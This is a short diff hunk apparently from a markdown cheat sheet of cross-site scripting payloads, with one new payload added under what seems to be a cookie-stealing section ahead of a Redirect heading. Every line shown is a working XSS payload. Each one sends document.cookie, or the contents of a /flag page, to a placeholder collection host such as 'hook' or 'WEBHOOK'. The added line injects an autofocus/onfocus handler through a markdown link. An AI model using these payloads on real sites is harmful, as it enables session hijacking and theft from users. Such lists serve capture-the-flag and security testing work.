@@ -21,6 +21,7 @@
   - `<img src=x onerror="javascript:document.location='https://hook?cookie='+document.cookie;">`
   - `<img src=x onerror="this.src='https://hook/?'+document.cookie;this.removeAttribute('onerror');">`
   - `"'&<></h1><script>fetch('/flag').then(r=>{r.text().then(t=>fetch('https://hook/?flag='+btoa(t),{'mode':'no-cors'}))})</script><h1></h1>`
+  - `[asd]('autofocus onfocus='location.href="https://WEBHOOK/?c="+document.cookie')`
  
 ### Redirect
 
